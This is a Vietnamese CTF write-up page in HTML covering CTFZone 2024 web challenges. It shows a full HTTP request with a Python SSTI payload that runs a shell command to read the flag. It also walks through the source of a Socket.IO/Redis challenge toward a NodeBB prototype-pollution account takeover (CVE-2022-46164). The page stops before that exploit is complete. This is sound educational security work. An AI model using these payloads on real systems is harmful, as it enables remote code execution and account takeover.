@@ -1,0 +1,1131 @@
+
+
+<!DOCTYPE html>
+<html lang="en" itemscope itemtype="http://schema.org/WebPage">
+  <head>
+    
+
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+
+  <title>CtfZone2024 - WEB &#39;s challenges - l3mnt2010&#39;s Blog</title>
+  <meta name="description" content="WEB challs web/0ld_b4t_g0ld Bài này là một bài black box tương đối đơn giản có chức năng reg &#43; login -&gt; sau khi login thì ta được chuyển đến một giao diện comment
+Sau khi comment thì sẽ hiển thị comment ở dưới:
+Quan sát api đã được gửi
+Vì thông tin đã bị escape nên khả năng là không xss được nên mình ngay lập tức nghĩ đến SSTI nhưng có vẻ không được để ý là api này version2 nên mình đổi thành version1 và may mắn nó vẫn có hoạt động">
+  <meta name="author" content="l3mnt2010"/><script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "WebSite",
+    "name": "l3mnt2010\u0027s Blog",
+    
+    "url": "https:\/\/l3mnt2010.github.io\/"
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Organization",
+  "name": "",
+  "url": "https:\/\/l3mnt2010.github.io\/"
+  
+  
+  
+  
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [{
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@id": "https:\/\/l3mnt2010.github.io\/",
+          "name": "home"
+        }
+    },{
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@id": "https:\/\/l3mnt2010.github.io\/write-up\/2024-08-10-ctfzone2024\/",
+          "name": "Ctf zone2024 web \u0027s challenges"
+        }
+    }]
+}
+</script><script type="application/ld+json">
+{
+  "@context": "http://schema.org",
+  "@type": "Article",
+  "author": {
+    "name" : ""
+  },
+  "headline": "CtfZone2024 - WEB \u0027s challenges",
+  "description" : "WEB challs web\/0ld_b4t_g0ld Bài này là một bài black box tương đối đơn giản có chức năng reg \u002b login -\u0026gt; sau khi login thì ta được chuyển đến một giao diện comment\nSau khi comment thì sẽ hiển thị comment ở dưới:\nQuan sát api đã được gửi\nVì thông tin đã bị escape nên khả năng là không xss được nên mình ngay lập tức nghĩ đến SSTI nhưng có vẻ không được để ý là api này version2 nên mình đổi thành version1 và may mắn nó vẫn có hoạt động",
+  "inLanguage" : "en",
+  "wordCount":  3245 ,
+  "datePublished" : "0001-01-01T00:00:00\u002b00:00",
+  "dateModified" : "0001-01-01T00:00:00\u002b00:00",
+  "image" : "https:\/\/l3mnt2010.github.io\/avatar.png",
+  "keywords" : [ "CTF, Vietnamese" ],
+  "mainEntityOfPage" : "https:\/\/l3mnt2010.github.io\/write-up\/2024-08-10-ctfzone2024\/",
+  "publisher" : {
+    "@type": "Organization",
+    "name" : "https:\/\/l3mnt2010.github.io\/",
+    "logo" : {
+        "@type" : "ImageObject",
+        "url" : "https:\/\/l3mnt2010.github.io\/avatar.png",
+        "height" :  60 ,
+        "width" :  60
+    }
+  }
+}
+</script>
+
+
+<meta property="og:title" content="CtfZone2024 - WEB &#39;s challenges" />
+<meta property="og:description" content="WEB challs web/0ld_b4t_g0ld Bài này là một bài black box tương đối đơn giản có chức năng reg &#43; login -&gt; sau khi login thì ta được chuyển đến một giao diện comment
+Sau khi comment thì sẽ hiển thị comment ở dưới:
+Quan sát api đã được gửi
+Vì thông tin đã bị escape nên khả năng là không xss được nên mình ngay lập tức nghĩ đến SSTI nhưng có vẻ không được để ý là api này version2 nên mình đổi thành version1 và may mắn nó vẫn có hoạt động">
+<meta property="og:image" content="https://l3mnt2010.github.io/avatar.png" />
+<meta property="og:url" content="https://l3mnt2010.github.io/write-up/2024-08-10-ctfzone2024/" />
+<meta property="og:type" content="website" />
+<meta property="og:site_name" content="l3mnt2010&#39;s Blog" />
+
+  <meta name="twitter:title" content="CtfZone2024 - WEB &#39;s challenges" />
+  <meta name="twitter:description" content="WEB challs web/0ld_b4t_g0ld Bài này là một bài black box tương đối đơn giản có chức năng reg &#43; login -&gt; sau khi login thì ta được chuyển đến một giao diện comment
+Sau khi comment thì sẽ hiển thị …">
+  <meta name="twitter:image" content="https://l3mnt2010.github.io/avatar.png" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <link href='https://l3mnt2010.github.io/avatar.png' rel='icon' type='image/x-icon'/>
+  <meta name="generator" content="Hugo 0.83.1" />
+  <link rel="alternate" href="https://l3mnt2010.github.io/index.xml" type="application/rss+xml" title="l3mnt2010&#39;s Blog"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.5.0/css/all.css" integrity="sha384-B4dIYHKNBt8Bc12p+WXckhzcICo0wtJAoU8YZTY5qE0Id1GSseTk6S+L3BlXeVIU" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous"><link rel="stylesheet" href="https://l3mnt2010.github.io/css/main.css" /><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/syntax.css" /><link rel="stylesheet" href="https://l3mnt2010.github.io/css/codeblock.css" /><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.css" integrity="sha384-h/L2W9KefUClHWaty3SLE5F/qvc4djlyR4qY3NUV5HGQBBW7stbcfff1+I/vmsHh" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/default-skin/default-skin.min.css" integrity="sha384-iD0dNku6PYSIQLyfTOpB06F2KCZJAKLOThS5HRe8b3ibhdEQ6eKsFf/EeFxdOt5R" crossorigin="anonymous">
+
+
+
+  </head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+  <div class="container-fluid">
+    <div class="navbar-header">
+      <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+      <a class="navbar-brand" href="https://l3mnt2010.github.io/">l3mnt2010&#39;s Blog</a>
+    </div>
+
+    <div class="collapse navbar-collapse" id="main-navbar">
+      <ul class="nav navbar-nav navbar-right">
+        
+          
+            <li>
+              <a title="Blog" href="https://l3mnt2010.github.io/">Blog</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Write-ups" href="https://l3mnt2010.github.io/write-up/">Write-ups</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Tags" href="https://l3mnt2010.github.io/tags">Tags</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="Home" href="https://l3mnt2010.github.io/">Home</a>
+            </li>
+          
+        
+          
+            <li>
+              <a title="About" href="https://l3mnt2010.github.io/about">About</a>
+            </li>
+          
+        
+
+        
+
+        
+      </ul>
+    </div>
+
+    
+      <div class="avatar-container">
+        <div class="avatar-img-border">
+          <a title="l3mnt2010&#39;s Blog" href="https://l3mnt2010.github.io/">
+            <img class="avatar-img" src="https://l3mnt2010.github.io/avatar.png" alt="l3mnt2010&#39;s Blog" />
+           
+          </a>
+        </div>
+      </div>
+    
+
+  </div>
+</nav>
+
+
+
+
+    
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+
+  
+  
+  
+
+
+
+
+
+
+  
+
+  <header class="header-section ">
+    
+    
+    <div class="intro-header no-img">
+      <div class="container">
+        <div class="row">
+          <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+            <div class="write-up-heading">
+              
+                <h1>CtfZone2024 - WEB &#39;s challenges</h1>
+              
+              
+                <hr class="small">
+              
+              
+              
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  
+  </header>
+
+
+    
+<div class="container" role="main">
+  <div class="row">
+    <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+      <article role="main" class="blog-post">
+        <!-- raw HTML omitted -->
+<h1 id="web-challs">WEB challs</h1>
+<h2 id="web0ld_b4t_g0ld">web/0ld_b4t_g0ld</h2>
+<p>Bài này là một bài black box tương đối đơn giản có chức năng reg + login -&gt; sau khi login thì ta được chuyển đến một giao diện comment</p>
+<p><img src="https://hackmd.io/_uploads/ry13EUD5C.png" alt="image"></p>
+<p>Sau khi comment thì sẽ hiển thị comment ở dưới:</p>
+<p><img src="https://hackmd.io/_uploads/SyTaVLPcA.png" alt="image"></p>
+<p>Quan sát api đã được gửi</p>
+<p><img src="https://hackmd.io/_uploads/rJBPH8wcC.png" alt="image"></p>
+<p>Vì thông tin đã bị escape nên khả năng là không xss được nên mình ngay lập tức nghĩ đến SSTI nhưng có vẻ không được để ý là api này version2 nên mình đổi thành version1 và may mắn nó vẫn có hoạt động</p>
+<p><img src="https://hackmd.io/_uploads/ByAOS8w9A.png" alt="image"></p>
+<p>Yếu cầu có username và comment thấy server chạy python nên thử vài lần thì thấy template là marko và ssti tại username.</p>
+<p><img src="https://hackmd.io/_uploads/Bka0rIPqA.png" alt="image"></p>
+<pre><code>POST /api/v1/UserComments HTTP/1.1
+Host: old-but-gold.ctfz.zone
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://old-but-gold.ctfz.zone/profile
+Content-Type: application/json
+Content-Length: 123
+Origin: http://old-but-gold.ctfz.zone
+Connection: close
+Cookie: access_token_cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcyMzM2Mjc3MCwianRpIjoiYTZiN2E0N2YtNDY3ZS00ZTg3LTg0YWQtZGI3NWYxOTVlMWQ3IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6Im1sZW1tbGVtMiIsIm5iZiI6MTcyMzM2Mjc3MCwiZXhwIjoxNzIzNDQ5MTcwfQ.Wpky92zcF4sz9SyzodyA57H3owu_m2Gf9GCAKtEoqzU
+Priority: u=0
+
+{&quot;contents&quot;:&quot;1&quot;,
+&quot;username&quot;: &quot;{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat app/flag').read()}}&quot;
+}
+</code></pre><p><img src="https://hackmd.io/_uploads/SkLZugU90.png" alt="image"></p>
+<p>flag: <code>CTFZone{h0w_d1d_y0u_f0und_rny_g0ld!!1!_3bca97c049e57af4be84e8e24f2cdb21}</code></p>
+<h2 id="webfunny-buttons-9-solves">web/Funny buttons [9 solves]</h2>
+<p>Đến với một challenge websocket + redis để lưu thông tin người dùng được tương tác qua redisClient chỉ có một chức năng đơn giản là đăng kí đăng nhập -&gt; click button -&gt; và ta có thể set thông điệp cho từng button và get nó thông qua DOM event tương tác với websocket.</p>
+<ul>
+<li>Vì author cho source nên ta sẽ đi vào phân tích luôn:</li>
+</ul>
+<h3 id="analysis">analysis</h3>
+<pre><code>// server.js
+
+const express = require('express');
+const session = require('express-session');
+const http = require('http');
+const { Server } = require(&quot;socket.io&quot;);
+
+const exphbs  = require('express-handlebars');
+const RedisStore = require(&quot;connect-redis&quot;).default
+const { redisClient, db } = require('./db');
+const { authorize, onConnection } = require('./socket.io')
+
+
+const HOST = '0.0.0.0';
+const PORT = process.env.PORT ?? '3000';
+const SESSION_SECRET = process.env.SESSION_SECRET ?? 'secret';
+const FLAG = process.env.FLAG ?? 'CTFZONE{redactedfunnyhere}';
+
+const app = express();
+const server = http.createServer(app);
+const io = new Server(server);
+const hbs = exphbs.create();
+
+app.use(express.urlencoded({ extended: false }));
+app.use(express.json());
+app.use('/static/', express.static('./static'))
+
+io.use(authorize);
+io.on('connection', onConnection);
+
+// views
+app.engine('handlebars', hbs.engine);
+app.set('view engine', 'handlebars');
+
+// session
+let sessionMiddleware = session({
+    store: new RedisStore({ client: redisClient }),
+    secret: SESSION_SECRET,
+    resave: false,
+    saveUninitialized: false,
+    cookie: {
+        secure: false,
+        httpOnly: true,
+    },
+})
+io.engine.use(sessionMiddleware);
+app.use(sessionMiddleware);
+
+// flash
+app.use((req, res, next) =&gt; {
+    const { render } = res;
+    req.session.flash = req.session.flash ?? [];
+    res.render = (template, options={}) =&gt; {
+        render.call(res, template, {
+            user: req.session?.user,
+            flash: req.session.flash,
+            ...options,
+        });
+        req.session.flash = [];
+    };
+    res.flash = (level, message) =&gt; {
+        req.session.flash.push({ level, message });
+    };
+    next();
+});
+
+const ensureAuth = (req, res, next) =&gt; {
+    if (!req.session?.user?.id) {
+      res.flash('warning', 'Login required');
+      return res.redirect('/login');
+    }
+    next();
+};
+
+app.get('/', ensureAuth, (req, res) =&gt; res.render('index', req.session.user));
+
+app.get('/register', (req, res) =&gt; res.render('register'));
+app.post('/register', async (req, res) =&gt; {
+    try {
+        await db.createUser(...Object.values(req.body));
+        res.redirect('/login');
+    } catch (error) {
+        console.error('create user error:', error?.message)
+        res.flash('danger', `Error: ${error?.message}`);
+        res.render('register');
+    }
+});
+
+app.get('/login', (req, res) =&gt; res.render('login'));
+app.post('/login', async (req, res) =&gt; {
+    const user = await db.getUserByNameAndPassword(...Object.values(req.body));
+    if (!user) {
+        res.flash('danger', 'invalid username or password');
+        return res.status(401).render('login');
+    }
+
+    await db.addSessionToUser(user.id, req.sessionID);
+    req.session.user = user;
+    res.redirect('/');
+});
+
+app.post('/logout', ensureAuth, (req, res) =&gt; {
+    const sid = req.sessionID;
+    const uid = req.session.user.id;
+    req.session.destroy(async (error) =&gt; {
+        if (error) {
+            console.error('logout error:', error?.message);
+        }
+        await db.removeSessionFromUser(uid, sid);
+        res.clearCookie('connect.sid');
+        res.redirect('/login');
+    });
+});
+
+server.listen(PORT, HOST, () =&gt; console.log(`Listening on ${HOST}:${PORT}`));
+
+</code></pre><ul>
+<li>Server khởi tạo server với expressjs + socket-io và hbs template để hiển thị giao diện.</li>
+</ul>
+<p>Để ý đầu tiên sẽ có chức năng register user -&gt; gọi method createUser của class db với thông tin username và password client gửi đến -&gt;</p>
+<pre><code>async createUser(name, password) {
+        const isAvailable = await redisClient.SETNX(`user:${name}`, 'PLACEHOLDER');
+        if (!isAvailable) {
+            throw new Error('user already exists!');
+        }
+
+        const uid = await redisClient.INCR('index:uid');
+        await redisClient.SET(`user:${name}`, uid);
+
+        const hash = await argon2.hash(password);
+        await redisClient.HSET(`uid:${uid}`, { name, hash });
+        return uid;
+    }
+</code></pre><p>Sử dụng redis để lưu thông tin của người dùng và uid của người dùng được tăng lên = số uid đã có + 1 với method <code>INCR</code> -&gt; hash password với agron2 và lưu vào redis với uid + name + hash.</p>
+<p>Sau khi đăng nhập xong thì người dùng sẽ có chức năng login -&gt; <code>db.getUserByNameAndPassword(...Object.values(req.body))</code> method này sẽ được gọi với tham số là username và passwd của người dùng -&gt;</p>
+<pre><code>async getUserByNameAndPassword(name, password) {
+        const uid = await redisClient.GET(`user:${name}`);
+        if (!uid) {
+            return null;
+        }
+        const user = await helpers.getUser(uid);
+        if (!user) {
+            return null;
+        }
+        try {
+            if (await argon2.verify(user.hash, password)) {
+                return user;
+            } else {
+                return null;
+            }
+        } catch (error) {
+            console.log('argon error:', error?.message);
+            return null;
+        }
+    }
+</code></pre><ul>
+<li>Tương tự thì server sẽ thực hiện lấy ra uid qua name -&gt; gọi method getUser</li>
+</ul>
+<pre><code>async getUser(uid) {
+        const user = await redisClient.HGETALL(`uid:${uid}`);
+        if (!user?.name) {
+            return null;
+        }
+        user.id = uid;
+        return user;
+    }
+</code></pre><p>Method này lấy tất cả user ra thông qua uid sau đó gán user.id là uid đã tìm được ở trên -&gt; ret user.</p>
+<p>Quay trở lại với flow login thì cuối cùng sẽ compare hash passwd tương tự như bcrypt nếu thành công thì ret user else null -&gt; tiếp theo sẽ gọi <code>await db.addSessionToUser(user.id, req.sessionID);</code></p>
+<pre><code>async addSessionToUser(uid, sid) {
+        return redisClient.SADD(`uid:${uid}:sessions`, sid);
+    }
+</code></pre><p>Chương trình sẽ lưu uid:sessions: sessionid của người dùng vào redis</p>
+<p>Cuối cùng sẽ gán <code>req.session.user = user</code> và chuyển hướng người dùng đến <code>/</code></p>
+<p>Chức năng logout thì quá quên thuộc nên mình sẽ không đề cập đến ở đây.</p>
+<ul>
+<li>Có 2 middleware nhưng ta chỉ chú ý đến</li>
+</ul>
+<pre><code>const ensureAuth = (req, res, next) =&gt; {
+    if (!req.session?.user?.id) {
+      res.flash('warning', 'Login required');
+      return res.redirect('/login');
+    }
+    next();
+};
+</code></pre><p>Cho thấy phải tồn tại <code>uid</code> của người dùng thì mới có quyền truy cập</p>
+<h3 id="socket-io-server">Socket-IO server:</h3>
+<pre><code>// socket.io/index.js
+
+const async = require('async');
+const cookieParser = require('cookie-parser')(process.env.SESSION_SECRET ?? 'secret');
+const { redisClient, db } = require('../db');
+const ratelimit = require('./ratelimit');
+
+let Namespaces = {};
+let onlineCount = 0;
+
+requireModules();
+db.flushOnlineUsers();
+db.flushPressedButtons();
+
+function onConnection(socket) {
+	db.incrOnlineUsers();
+	socket.ip = (socket.request.headers['x-forwarded-for'] || socket.request.connection.remoteAddress || '').split(',')[0];
+
+	socket.onAny((eventName, params, callback) =&gt; {
+		onMessage(socket, eventName, params, callback);
+	});
+    socket.on('disconnect', function() {
+        onlineCount--;
+		db.decrOnlineUsers();
+    });
+	socket.on(&quot;connect_error&quot;, (err) =&gt; {
+		console.log(`connect_error due to ${err.message}`);
+	});
+}
+
+function onMessage(socket, eventName, params, callback) {
+	callback = typeof callback === 'function' ? callback : function () {};
+	if (!eventName) {
+		console.log('[socket.io] Empty method name');
+		return callback({ message: '[socket.io] Empty method name' });
+	}
+	if (!params) {
+		console.log('[socket.io] Empty payload');
+		return callback({ message: '[socket.io] Empty payload' });
+	}
+
+	var parts = eventName.toString().split('.');
+	var namespace = parts[0];
+	var methodToCall = parts.reduce(function (prev, cur) {
+		if (prev !== null &amp;&amp; prev[cur]) {
+			return prev[cur];
+		}
+		return null;
+	}, Namespaces);
+
+	if (!methodToCall) {
+		if (process.env.NODE_ENV === 'development') {
+			console.log('[socket.io] Unrecognized message: ' + eventName);
+		}
+		return callback({ message: '[[error:invalid-event]]' });
+	}
+
+	socket.previousEvents = socket.previousEvents || [];
+	socket.previousEvents.push(eventName);
+	if (socket.previousEvents.length &gt; 20) {
+		socket.previousEvents.shift();
+	}
+
+	if (ratelimit.isFlooding(socket)) {
+		console.log('[socket.io] Too many emits! Disconnecting uid : ' + socket.uid + '. Events : ' + socket.previousEvents);
+		return socket.disconnect();
+	}
+
+	async.waterfall([
+		function (next) {
+			if (Namespaces[namespace].before) {
+				Namespaces[namespace].before(socket, eventName, params, next);
+			} else {
+				next();
+			}
+		},
+		function (next) {
+			methodToCall(socket, params, next);
+		},
+	], function (err, result) {
+		console.log('result', err, result);
+		callback(err ? { message: err.message } : null, result);
+	});
+}
+
+function requireModules() {
+	var modules = [
+		'user',
+		'button',
+		'room'
+	];
+
+	modules.forEach(function (module) {
+		Namespaces[module] = require('./' + module);
+	});
+}
+
+function authorize(socket, callback) {
+	let request = socket.request;
+	if (!request) {
+		return callback(new Error('[[error:not-authorized]]'));
+	}
+
+	async.waterfall([
+		function (next) {
+			cookieParser(request, {}, next);
+		},
+		function (next) {
+			if (!request.session?.user?.id) {
+				return next(new Error('[[error:not-authorized]]'));
+			}
+			socket.uid = parseInt(request.session.user.id, 10);
+			socket.uname = request.session.user.name;
+			next();
+		},
+	], callback);
+}
+
+module.exports = {
+	authorize,
+    onConnection
+};
+
+</code></pre><p>Khi server được khởi tạo sẽ gọi luôn <code>authorize</code> là middleware + onConnection để khởi tạo connect đến socket server.</p>
+<p>onConnection sẽ lấy số lượng user online được lưu trong redis và tăng lên 1 tính thêm cả client mới join</p>
+<pre><code>async incrOnlineUsers() {
+        return await redisClient.INCR('online');
+    }
+</code></pre><p>Lây ip của người dùng qua các header -&gt; lắng nghe bất kì even nào được emit đến và gọi <code>onMessage(socket, eventName, params, callback);</code></p>
+<p>Tương tự lắng nghe sự kiện disconnect hoặc trả tra các exception khi xảy ra lỗi</p>
+<p>Đầu tiên là socket sẽ khởi tạo các biến để chứa dữ liệu + gọi các hàm để khởi tạo</p>
+<pre><code>let Namespaces = {};
+let onlineCount = 0;
+
+requireModules();
+db.flushOnlineUsers();
+db.flushPressedButtons();
+</code></pre><pre><code>function requireModules() {
+	var modules = [
+		'user',
+		'button',
+		'room'
+	];
+
+	modules.forEach(function (module) {
+		Namespaces[module] = require('./' + module);
+	});
+}
+</code></pre><ul>
+<li>Gắn các key vào <code>Namespaces</code> là <code>user</code> <code>button</code> <code>room</code> và giá trị là giá trị được export ra từ các module tương ứng.</li>
+</ul>
+<pre><code>// module user
+
+
+const { db } = require('../db');
+
+function getOnline(socket, data, callback){
+    db.getOnlineUsers().then(res =&gt; {
+        socket.emit('user.getOnline', {success: true, count: res});
+    }).catch(err =&gt; callback(err));
+}
+
+function getInfo(socket, data, callback){
+    socket.emit('user.getInfo', {
+        success: true,
+        info: {
+            uname: socket.uname,
+            uid: socket.uid
+        }
+    });
+}
+
+module.exports = {
+    getOnline,
+    getInfo
+}
+</code></pre><p>ở đây sẽ có 2 func được trả ra đầu tiên là lấy số lượng user online bằng cách lắng nghe <code>user.getOnline</code> và trả ra <code>success: true, count: res}</code>
+Tiếp theo là func getInfo sẽ lắng nghe <code>user.getInfo</code> và trả ra <code>success: true, info: { uname: socket.uname, uid: socket.uid } }</code></p>
+<pre><code>// module 
+</code></pre><pre><code>// module button
+
+
+const { db } = require('../db');
+
+function getAll(socket, data, callback){
+    db.getAllButtons().then(res =&gt; {
+        socket.emit('button.getAll', {success: true, buttons: res});
+    });
+}
+
+function get(socket, data, callback){
+    if (!data?.id || data?.id &lt; 1 || data?.id &gt; 25){
+        return callback(new Error('invalid button id'));
+    }
+
+    db.getButton(data.id).then(button =&gt; {
+        if (!button?.isPressed || button?.uid !== socket.uid){
+            return callback(new Error('you should press button first!'));
+        }
+
+        db.getFunny(data.id, socket.uid).then(res =&gt; {
+            socket.emit('button.get', {success: true, id: data.id, funny: res});
+        });
+    }).catch(err =&gt; callback(err));
+}
+
+function set(socket, data, callback){
+    if (!data?.id || data?.id &lt; 1 || data?.id &gt; 25)
+        return callback(new Error('invalid button id'));
+
+    if (!data?.funny)
+        return callback(new Error('no funny?'));
+
+    db.getButton(data.id).then(button =&gt; {
+        if (!button?.isPressed || button?.uid !== socket.uid){
+            return callback(new Error('you should press button first!'));
+        }
+        
+        db.setFunny(data.id, socket.uid, data.funny).then(res =&gt; {
+            socket.emit('button.set', {success: true});
+        });
+    }).catch(err =&gt; callback(err));
+}
+
+function press(socket, data, callback){
+    if (!data?.id || data?.id &lt; 1 || data?.id &gt; 25)
+        return callback(new Error('invalid button id'));
+
+    db.getButton(data.id).then(async button =&gt; {
+        db.setButton(data.id, !(button?.isPressed|0), socket.uid).then(res =&gt; {
+            let pressed = !(button?.isPressed|0);
+            let uname = pressed ? socket.uname.substring(0,8) : NaN;
+            let uid = pressed ? socket.uid : NaN;
+            let result = {
+                success: true,
+                id: data.id,
+                pressed: pressed,
+                uname: uname,
+                uid: uid
+            };
+            socket.emit('button.press', result);
+            socket.in('online_users').emit('button.press', result);
+        });
+    }).catch(err =&gt; callback(err));
+}
+
+module.exports = {
+    getAll,
+    get,
+    set,
+    press
+}
+</code></pre><p>ở đây sẽ là phần ta chú ý nhiều và có tới 4 func được export</p>
+<p>getAll sẽ trả ra tổng cộng 25 buttons với các thông tin:</p>
+<pre><code>result.push({
+                id: i+1,
+                pressed: pressed,
+                uname: uname,
+                uid: uid
+            });
+</code></pre><p>get sẽ nhận data là id -&gt; kiểm tra id có hợp lệ với số lượng các button hiện có hay không -&gt; kiểm tra xem người dùng đã bấm nút hay chưa -&gt; nếu đã bấm thì sẽ gọi:</p>
+<pre><code>async getFunny(id, uid) {
+        return await redisClient.GET(`button:${id}:${uid}:funny`);
+    }
+</code></pre><p>Sau đó sẽ trả ra thông tin <code>{success: true, id: data.id, funny: res}</code></p>
+<p>set cũng tương tự nhưng khác ở chỗ là nó nhận data funny -&gt; lưu vào trong redis</p>
+<p>cuối cùng là press nó sẽ lưu vào redis là button đã được press hay chưa</p>
+<p>cuối cùng là module room</p>
+<pre><code> //module room
+ 
+function join(socket, data, callback){
+    if (!data?.room)
+        return callback(new Error('invalid room'))
+    socket.join(data.room);
+}
+
+module.exports = {
+	join
+};
+
+</code></pre><p>Kiểm tra xem phòng có tồn tại hay không và join vào phòng đó</p>
+<p>Quay trở lại với flow chính khi khởi tạo socket.io server -&gt; sau khi gọi hàm khởi tạo cho Namespaces -&gt; gọi <code>db.flushOnlineUsers(); db.flushPressedButtons();</code> để set online user về 0 và button set về chưa press.</p>
+<p>middleware được sử dụng là author</p>
+<pre><code>function authorize(socket, callback) {
+	let request = socket.request;
+	if (!request) {
+		return callback(new Error('[[error:not-authorized]]'));
+	}
+
+	async.waterfall([
+		function (next) {
+			cookieParser(request, {}, next);
+		},
+		function (next) {
+			if (!request.session?.user?.id) {
+				return next(new Error('[[error:not-authorized]]'));
+			}
+			socket.uid = parseInt(request.session.user.id, 10);
+			socket.uname = request.session.user.name;
+			next();
+		},
+	], callback);
+}
+</code></pre><p>Sử dụng <code>cookieParser</code> parse cookie client -&gt; lấy ra id + name của người dùng và gắn vào biến socket</p>
+<p>Thì đó sẽ là flow chính của chương trình -&gt; tiếp theo ta sẽ đi tìm nơi giấu flag của tác giả</p>
+<pre><code>#!/bin/bash
+
+while ! nc -z $REDIS_HOST $REDIS_PORT; do
+    sleep 0.1
+done
+
+# admin sending funny or smth
+node &lt;&lt;-EOF
+const { redisClient, db } = require('./db');
+const crypto = require(&quot;crypto&quot;);
+const funny = process.env.FLAG ?? 'CTFZONE{redactedfunnyhere}';
+
+(async () =&gt; {
+    let user = await db.getUser(1);
+    if (!user?.name){
+        let username = 'admin';
+        let password = crypto.randomBytes(20).toString('hex');
+        await db.createUser(username, password);
+
+        let buttonId = Math.floor(Math.random() * 24)+1
+        await db.setButton(buttonId, true, 1);
+        await db.setFunny(buttonId, 1, funny);
+    }
+    process.exit();
+})();
+EOF
+
+node server.js
+</code></pre><ul>
+<li>Khi chạy chương trình thì shell này sẽ được gọi và tạo một user với name là admin + passrandom -&gt; random funny sẽ chứa trong 1 button từ 1 đến 25 -&gt; set buttonId là đã press + set funny là giá trị của flag.</li>
+</ul>
+<p>Vậy thì ta có thể thấy được flag bằng việc getFunny <code>redisClient.GET(`button:${id}:${uid}:funny`)</code></p>
+<p>Để ý 2 tham số được truyền vào <code>db.getFunny(data.id, socket.uid)</code> arg[0] là data.id là id của button và giá trị này ta có thể control, arg[1] là socket.uid -&gt; như ta phân tích ở trên thì giá trị này sẽ được xử lí :</p>
+<pre><code>function (next) {
+			if (!request.session?.user?.id) {
+				return next(new Error('[[error:not-authorized]]'));
+			}
+			socket.uid = parseInt(request.session.user.id, 10);
+			socket.uname = request.session.user.name;
+			next();
+		}
+</code></pre><p>Và đây là session của user được set ngay sau khi ta login và như đã biết thì chắc chắn nó sẽ khác 1 vậy thì lấy flag là bất khả thi tại thời điểm này.</p>
+<h3 id="cve-2022-46164-account-takeover-via-prototype-vulnerability-in-nodebb">CVE-2022-46164 Account takeover via prototype vulnerability in NodeBB</h3>
+<p>Như nãy mình nói ở trên thì sau khi mà khởi tạo connection thì server sẽ lắng nghe bất kì event nào được gửi đến và sẽ dùng hàm onMessage để xử lí callback tương ứng</p>
+<pre><code>function onMessage(socket, eventName, params, callback) {
+	callback = typeof callback === 'function' ? callback : function () {};
+	if (!eventName) {
+		console.log('[socket.io] Empty method name');
+		return callback({ message: '[socket.io] Empty method name' });
+	}
+	if (!params) {
+		console.log('[socket.io] Empty payload');
